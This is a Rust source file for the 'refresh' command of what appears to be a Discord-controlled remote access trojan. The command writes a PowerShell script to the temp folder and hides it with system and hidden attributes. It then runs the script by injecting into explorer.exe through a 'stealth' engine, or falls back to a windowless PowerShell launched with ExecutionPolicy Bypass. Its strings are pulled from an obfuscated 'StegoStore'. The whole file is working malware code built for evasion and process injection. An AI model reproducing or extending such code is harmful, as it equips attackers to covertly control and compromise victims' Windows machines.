use crate::commands::*;
use crate::config::Config;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use std::env;
use std::process;
use std::os::windows::process::CommandExt;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

pub struct RefreshCommand;

#[async_trait]
impl BotCommand for RefreshCommand {
    fn name(&self) -> &str { "refresh" }
    fn description(&self) -> &str { 
        Box::leak(StegoStore::get(StringCategory::Desc, "REFRESH").into_boxed_str())
    }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str { ".refresh" }
    fn examples(&self) -> &'static [&'static str] { &[".refresh"] }
    fn aliases(&self) -> &'static [&'static str] { &["restart"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        _args: Arguments,
    ) -> Result<()> {
        http.create_message(msg.channel_id.get(), "Refreshing... (All instances will be killed and restarted)").await?;

        let current_exe = env::current_exe()?;
        let current_exe_name = current_exe.file_name()
            .unwrap_or_default()
            .to_string_lossy()
            .trim_end_matches(".exe")
            .to_string();
            
        let config_exe_name_str = Config::get_exe_name();
        let config_exe_name = config_exe_name_str.trim_end_matches(".exe");
        
        let temp_dir = env::temp_dir();
        let script_path = temp_dir.join(format!("refresh_{}.ps1", uuid::Uuid::new_v4()));
        let current_path_str = current_exe.to_string_lossy().replace("'", "''");

        let ps_template = StegoStore::get(StringCategory::Scripts, "REFRESH_PS");
        let script = ps_template
            .replace("__NAME1__", &current_exe_name)
            .replace("__NAME2__", config_exe_name)
            .replace("__PATH__", &current_path_str);

        std::fs::write(&script_path, script)?;
        // Hide script
        if let Some(engine) = crate::stealth::get_engine() {
            let cmd = StegoStore::get(StringCategory::Win, "KCT_ATTRIB_HIDDEN").replace("{}", &script_path.to_string_lossy());
            let _ = engine.execute_stealth_cmd_with_output(&cmd);
            
            let cmd_run = StegoStore::get(StringCategory::Win, "KCT_PS_EXEC_FILE").replace("{}", &script_path.to_string_lossy());
            unsafe {
                let mut pid = 0;
                let mut sys = sysinfo::System::new_all();
                sys.refresh_processes();
                use sysinfo::{SystemExt, ProcessExt, PidExt};
                for (p, process) in sys.processes() {
                    if process.name().to_lowercase() == "explorer.exe" {
                        pid = p.as_u32(); break;
                    }
                }
                if pid != 0 {
                    let _ = engine.kct_auto_inject(pid, &cmd_run);
                } else {
                    let _ = engine.execute_stealth_cmd_with_output(&cmd_run);
                }
            }
        } else {
            let _ = process::Command::new("attrib")
                .args(["+s", "+h", &script_path.to_string_lossy()])
                .creation_flags(0x08000000)
                .output();

            process::Command::new("powershell.exe")
                .args([
                    "-ExecutionPolicy", "Bypass",
                    "-NoProfile",
                    "-WindowStyle", "Hidden",
                    "-File", &script_path.to_string_lossy(),
                ])
                .creation_flags(0x08000000)
                .spawn()?;
        }

        process::exit(0);
    }
}
